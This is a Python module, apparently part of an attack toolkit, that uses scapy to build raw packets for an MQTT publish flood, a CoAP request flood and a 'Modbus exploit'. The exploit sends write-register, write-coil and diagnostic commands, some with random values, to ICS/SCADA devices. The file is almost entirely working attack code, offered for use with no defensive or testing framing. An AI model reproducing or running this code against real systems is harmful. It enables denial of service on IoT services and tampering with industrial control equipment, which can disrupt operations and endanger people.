"""
IoT protocol attack module — MQTT publish flood, CoAP flood, Modbus exploit.

Targets IoT-specific protocols commonly found in industrial / smart-home
environments.
"""

from __future__ import annotations

import logging
import random
import struct
import time

from scapy.all import IP, TCP, UDP, Raw, send, RandShort, RandString, conf

log = logging.getLogger(__name__)

conf.verb = 0

HANDLERS = {}


def _register(name):
    def decorator(fn):
        HANDLERS[name] = fn
        return fn
    return decorator


def run_attack(
    sub_type: str,
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    handler = HANDLERS.get(sub_type)
    if handler is None:
        raise ValueError(f"Unknown iot-protocol sub_type: {sub_type!r}")
    return handler(target_ip, target_port, duration, rate_multiplier, params)


# ── MQTT Publish Flood ───────────────────────────────────

def _build_mqtt_publish(topic: str, payload: bytes, qos: int = 0) -> bytes:
    """
    Build a raw MQTT PUBLISH packet (v3.1.1 wire format).
    This avoids needing a full MQTT client library.
    """
    # Fixed header: PUBLISH = 0x30 | (QoS << 1)
    pkt_type = 0x30 | ((qos & 0x03) << 1)

    # Variable header: topic length (2 bytes) + topic + optional packet ID
    topic_bytes = topic.encode("utf-8")
    var_header = struct.pack(">H", len(topic_bytes)) + topic_bytes

    if qos > 0:
        packet_id = random.randint(1, 65535)
        var_header += struct.pack(">H", packet_id)

    remaining = var_header + payload

    # Encode remaining length (MQTT variable-length encoding)
    rem_len_bytes = b""
    rem = len(remaining)
    while True:
        encoded_byte = rem % 128
        rem = rem // 128
        if rem > 0:
            encoded_byte |= 0x80
        rem_len_bytes += bytes([encoded_byte])
        if rem == 0:
            break

    return bytes([pkt_type]) + rem_len_bytes + remaining


@_register("mqtt_publish")
def mqtt_publish(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Flood MQTT broker with PUBLISH messages."""
    broker_port = params.get("broker_port", 1883)
    if target_port == 80:  # override default port
        target_port = broker_port

    topic = params.get("topic", "iot/#")
    qos = params.get("qos", 0)
    base_rate = params.get("message_rate", 500)
    pps = int(base_rate * rate_multiplier)

    log.info("MQTT publish flood → %s:%d topic=%s at ~%d mps", target_ip, target_port, topic, pps)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        # Random sensor-like payload
        payload = f'{{"temp":{random.uniform(15,45):.1f},"ts":{int(time.time())}}}'.encode()
        mqtt_bytes = _build_mqtt_publish(topic, payload, qos)

        pkt = (
            IP(dst=target_ip) /
            TCP(sport=RandShort(), dport=target_port, flags="PA") /
            Raw(load=mqtt_bytes)
        )
        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {"packets_sent": packets_sent, "attack": "mqtt_publish", "topic": topic}


# ── CoAP Flood ───────────────────────────────────────────

def _build_coap_request(method_code: int, uri_path: str, payload: bytes = b"") -> bytes:
    """
    Build a raw CoAP request (RFC 7252 wire format).
    Version=1, Type=0 (CON), Token length=2.
    """
    version = 1
    msg_type = 0  # Confirmable
    token_length = 2
    first_byte = (version << 6) | (msg_type << 4) | token_length

    message_id = random.randint(0, 65535)
    token = random.randbytes(2)

    header = bytes([first_byte, method_code]) + struct.pack(">H", message_id) + token

    # Uri-Path option (number 11)
    options = b""
    for segment in uri_path.strip("/").split("/"):
        seg_bytes = segment.encode("utf-8")
        # Option delta=11 for first, format: (delta << 4) | length
        if not options:
            options += bytes([0xB0 | min(len(seg_bytes), 12)]) + seg_bytes
        else:
            # Subsequent path segments: delta=0
            options += bytes([0x00 | min(len(seg_bytes), 12)]) + seg_bytes

    if payload:
        return header + options + b"\xff" + payload
    return header + options


@_register("coap_flood")
def coap_flood(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Flood CoAP server with CON requests."""
    coap_port = 5683
    if target_port == 80:
        target_port = coap_port

    uri = params.get("uri", "/sensor/temp")
    method = params.get("method", "GET").upper()
    base_rate = params.get("rate", 300)
    pps = int(base_rate * rate_multiplier)

    method_codes = {"GET": 1, "POST": 2, "PUT": 3, "DELETE": 4}
    code = method_codes.get(method, 1)

    log.info("CoAP flood %s %s → %s:%d at ~%d rps", method, uri, target_ip, target_port, pps)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        payload = b""
        if method in ("POST", "PUT"):
            payload = f'{{"value":{random.uniform(0,100):.2f}}}'.encode()

        coap_bytes = _build_coap_request(code, uri, payload)

        pkt = (
            IP(dst=target_ip) /
            UDP(sport=RandShort(), dport=target_port) /
            Raw(load=coap_bytes)
        )
        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {"packets_sent": packets_sent, "attack": "coap_flood", "uri": uri, "method": method}


# ── Modbus Exploit ───────────────────────────────────────

def _build_modbus_tcp(function_code: int, register: int, value: int) -> bytes:
    """
    Build a raw Modbus TCP frame (MBAP header + PDU).
    Transaction ID (2) + Protocol ID (2, =0) + Length (2) + Unit ID (1) + FC + Data
    """
    transaction_id = random.randint(0, 65535)
    protocol_id = 0  # Modbus
    unit_id = 1

    if function_code == 6:
        # Write Single Register: FC(1) + Register(2) + Value(2)
        pdu = struct.pack(">BHH", function_code, register, value)
    elif function_code == 3:
        # Read Holding Registers: FC(1) + Start(2) + Count(2)
        pdu = struct.pack(">BHH", function_code, register, value)
    elif function_code == 16:
        # Write Multiple Registers: FC(1) + Start(2) + Count(2) + Bytes(1) + Values
        count = 1
        pdu = struct.pack(">BHHB", function_code, register, count, count * 2)
        pdu += struct.pack(">H", value)
    else:
        pdu = struct.pack(">B", function_code)

    length = 1 + len(pdu)  # Unit ID + PDU
    mbap = struct.pack(">HHH", transaction_id, protocol_id, length) + bytes([unit_id])

    return mbap + pdu


@_register("modbus_exploit")
def modbus_exploit(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Send malicious Modbus TCP commands to ICS/SCADA devices."""
    modbus_port = 502
    if target_port == 80:
        target_port = modbus_port

    function_code = params.get("function_code", 6)
    register = params.get("register", 0)
    value = params.get("value", 9999)
    base_rate = 50
    pps = int(base_rate * rate_multiplier)

    log.info(
        "Modbus exploit → %s:%d FC=%d reg=%d val=%d at ~%d pps",
        target_ip, target_port, function_code, register, value, pps,
    )

    packets_sent = 0
    deadline = time.time() + duration

    # Rotate through dangerous function codes
    dangerous_fcs = [6, 5, 15, 16, 8]  # Write register, coil, diagnostics

    while time.time() < deadline:
        fc = random.choice(dangerous_fcs) if random.random() < 0.3 else function_code
        reg = register + random.randint(0, 10)
        val = value if random.random() < 0.7 else random.randint(0, 65535)

        modbus_bytes = _build_modbus_tcp(fc, reg, val)

        pkt = (
            IP(dst=target_ip) /
            TCP(sport=RandShort(), dport=target_port, flags="PA") /
            Raw(load=modbus_bytes)
        )
        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {
        "packets_sent": packets_sent,
        "attack": "modbus_exploit",
        "function_code": function_code,
        "register": register,
    }
